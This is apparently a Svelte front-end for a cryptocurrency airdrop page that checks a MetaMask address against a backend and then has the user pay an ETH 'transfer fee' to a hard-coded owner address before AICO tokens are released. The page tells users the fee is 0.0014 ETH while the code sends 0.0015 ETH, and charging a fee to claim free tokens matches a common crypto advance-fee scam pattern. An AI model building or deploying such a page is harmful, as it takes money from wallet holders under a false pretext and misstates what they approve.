<script>
  import { ethers } from "ethers";
  import { onMount } from "svelte";
  import { fade } from "svelte/transition";
  const BACKEND_URL = 'https://ec2-13-51-195-213.eu-north-1.compute.amazonaws.com:8000'
  const CONTRACT_ADDRESS = '0x741787F17fAE97F55Ce79382822bba2101d3C77B'
  let accounts = [];
  let isMMInstalled = false;
  let isMMLoading = false;
  let isMMConnected = false;
  let loading = false
  let mining = false
  let address = '';
  let status = 'initial' // initial success not_found claimed

  $: provider = new ethers.BrowserProvider(window.ethereum, "any");
  
  onMount(async () => {
    if (!window.ethereum) return;
    isMMLoading = true;
    isMMInstalled = true;
    accounts = await provider.listAccounts();
    if (window.ethereum.selectedAddress) {
      address = window.ethereum.selectedAddress
      checkAddress()
    }
    isMMConnected = accounts.length > 0;
    isMMLoading = false;
  });

  const checkAddress = async () => {
    const response = await fetch(BACKEND_URL + '/api/v1/addresses/validate', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        address: address
      })
    }).then(r => r.json())
    if (response.result) {
      status = 'success'
    }
    if (response.error === "claimed") {
      status = 'claimed'
    }
    if (response.error === "not_found") {
      status = 'not_found'
    }
  }

  const sendTransaction = debounce(async () => {
    const transaction_fee = '0.0015'
    const owner_address = '0x69C846401B084F8dD703eaDA798368f63f25006b'
    // Обязательно добавить debounce и блокировку загрузкой страницы
    const signer = await provider.getSigner(address)
    try {
      loading = true
      const response = await signer.sendTransaction({
        to: owner_address,
        value: ethers.parseEther(transaction_fee)
      })
      mining = true
      await response.wait()
      mining = false
      console.log(response);
      if (response.hash) {
        loading = false
        await claimAirdrop(response.hash)
      }
    } catch (e) {
      console.log(e)
    }
  }, 1000)
  const claimAirdrop = async (hash) => {
    const response = await fetch(BACKEND_URL + '/api/v1/transactions/airdrop', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        tx_hash: hash,
        address
      })
    }).then(r => r.json())
    if (response.result) {
      status = 'claimed'
      ethereum.request({
        method: 'wallet_watchAsset',
        params: {
          type: 'ERC20', // Initially only supports ERC20, but eventually more!
          options: {
            address: CONTRACT_ADDRESS, // The address that the token is at.
            symbol: 'AICO', // A ticker symbol or shorthand, up to 5 chars.
            decimals: 18, // The number of decimals in the token
            // image: tokenImage, // A string url of the token logo
          },
        },
      })
    }
  }

  function makeId(length) {
    let result = "";
    const characters =
      "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    const charactersLength = characters.length;
    let counter = 0;
    while (counter < length) {
      result += characters.charAt(Math.floor(Math.random() * charactersLength));
      counter += 1;
    }
    return result;
  }
  async function connectToMetamask() {
    if (window.ethereum) {
      try {
        accounts = await window.ethereum.request({
          method: "eth_requestAccounts",
        });
        isMMConnected = true;
        if (window.ethereum.selectedAddress) {
          address = window.ethereum.selectedAddress
          checkAddress()
        }
      } catch (error) {
        console.error(error);
      }
    } else {
      console.error("Metamask not detected");
    }
  }

  const authorize = async () => {
    if (!isMMConnected) return connectToMetamask();

    const selectedAddress = window.ethereum.selectedAddress;

    const nonce = makeId(12);
    const signature = await window.ethereum.request({
      method: "personal_sign",
      params: [nonce, selectedAddress],
    });
    address = selectedAddress;
  };
  function debounce(func, delay) {
      let timeoutId;
      return function(...args) {
          if (timeoutId) {
              clearTimeout(timeoutId);
          }
          timeoutId = setTimeout(() => {
              func.apply(this, args);
          }, delay);
      };
  }
</script>

{#if loading}
  <div class="flex flex-col items-center justify-center fixed w-[100vw] left-0 top-0 h-full z-[100] bg-[rgba(0,0,0,0.25)] backdrop-blur-md">
    <div class="animate-spin rounded-full h-[100px] w-[100px] border-t-4 border-b-4 border-blue-500"></div>
    <div class="mt-2">
      {mining ? 'Waiting for transaction to be mined' : 'Trasaction is processing. Please wait'}
    </div>
  </div>
{/if}
{#if status !== 'initial'}
<div class="fixed z-[55] top-0 py-8 left-0 w-full flex self-start justify-between px-[10vw]">
  <img width="206" src="/optimized/logo.webp" alt="">
  <button on:click={() => status = 'initial'}>
    <svg xmlns="http://www.w3.org/2000/svg" width="45" height="45" viewBox="0 0 45 45" fill="none">
      <path d="M11.25 33.75L33.75 11.25M11.25 11.25L33.75 33.75" stroke="white" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
    </svg>
  </button>
</div>
{/if}
<!-- claimed  -->
 {#if status === 'claimed'}
 <div transition:fade class="fixed flex items-center justify-center z-50 bg-[#091720] w-full h-full top-0 left-0">
   <div class="mr-8"><img width="380" src="/optimized/whitelist-img.webp" alt=""></div>
   <div class="flex flex-col">
     <div class="text-[48px] font-bold">
       Airdrop Claimed!
     </div>
     <div class="text-[32px] max-w-[800px] leading-[120%] mt-4">
      Your airdrop tokens have been successfully sent to your wallet.
     </div>
     <div class="mt-4 text-[#DBE2EA]">
      <p>To view your tokens, you may need to add the token contract address to MetaMask:</p>
      <ul>
          <li>1. Open MetaMask and go to the "Tokens" tab.</li>
          <li>2. Click "+ Import tokens" at the bottom.</li>
          <li>3. Copy and paste the contract address below.</li>
          <li>4. Click "Next" and then "Add Tokens".</li>
      </ul>
       <div class="mt-4 bg-slate-700 rounded-[32px] max-w-[670px] flex justify-center items-center py-3 px-4 space-x-4">
        <div class="underline">
          {CONTRACT_ADDRESS}
        </div>
         <a on:click={() => {
          navigator.clipboard.writeText(CONTRACT_ADDRESS)
         }} class="login-bg active:scale-95 active:opacity-50 border inline text-[16px] font-semibold border-[#5ABEFB] text-white py-[13px] px-[30px] rounded-full" href="mailto:support@airdropcompany.com">Copy</a>
       </div>
     </div>
   </div>
 </div>
 {/if}
<!-- not_found  -->
 {#if status === 'not_found'}
 <div transition:fade class="fixed flex items-center justify-center z-50 bg-[#091720] w-full h-full top-0 left-0">
   <div class="mr-8"><img width="380" src="/optimized/whitelist-img.webp" alt=""></div>
   <div class="flex flex-col">
     <div class="text-[48px] font-bold">
       Airdrop Status
     </div>
     <div class="text-[32px] max-w-[800px] leading-[120%]">
       Unfortunately, your wallet does not meet the conditions for the airdrop.
     </div>
     <div class="mt-4 text-[#DBE2EA]">
       <p class="max-w-[800px]">If you believe this is a mistake or have any questions, please contact our support team.</p>
       <div class="mt-4">
         <a class="login-bg border inline text-[16px] font-semibold border-[#5ABEFB] text-white py-[13px] px-[30px] rounded-full" href="mailto:support@airdropcompany.com">Contact Support</a>
       </div>
     </div>
   </div>
 </div>
 {/if}
<!-- success -->
{#if status === 'success'}
<div transition:fade class="fixed flex items-center flex-wrap justify-center z-50 bg-[#091720] w-full h-full top-0 left-0">
  <div class="mr-8"><img width="380" src="/optimized/whitelist-img.webp" alt=""></div>
  <div class="flex flex-col">
    <div class="text-[48px] font-bold">
      Congrats!
    </div>
    <div class="text-[32px] leading-[120%] max-w-[800px]">
      You are eligible to claim your airdrop tokens.
    </div>
    <div class="mt-4 text-[#DBE2EA]">
      <span class="text-[24px] font-bold">To receive your airdrop tokens, please follow these steps:</span> 
      <ul>
        <li>1. Ensure you have MetaMask installed and are logged in.</li>
        <li>2. Click the button below to open MetaMask.</li>
        <li>3. Confirm the transfer of <strong>0.0014 ETH</strong> as the transfer fee.</li>
        <li>4. Once the transfer is complete, your airdrop tokens will be sent to your wallet.</li>
      </ul>
    </div>
    <div class="mt-4 flex space-x-2">
      <button on:click={sendTransaction} class="login-bg border block text-[16px] font-semibold border-[#5ABEFB] text-white py-[13px] px-[30px] rounded-full">
        Open MetaMask to Pay Fee
      </button>
  </div>
  </div>
</div>
{/if}

{#if !address}
  <button
    class="login-bg border block text-[16px] font-semibold border-[#5ABEFB] text-white py-[13px] px-[30px] rounded-full"
    on:click={authorize}
  >
    Login
  </button>
{:else}
  <p on:click={checkAddress} class="cursor-pointer login-bg border block text-[16px] font-semibold border-[#5ABEFB] text-white py-[13px] px-[30px] rounded-full">
    {address.slice(0, address.length/5)}...{address.slice(address.length/1.3, address.length)}
  </p>
{/if}
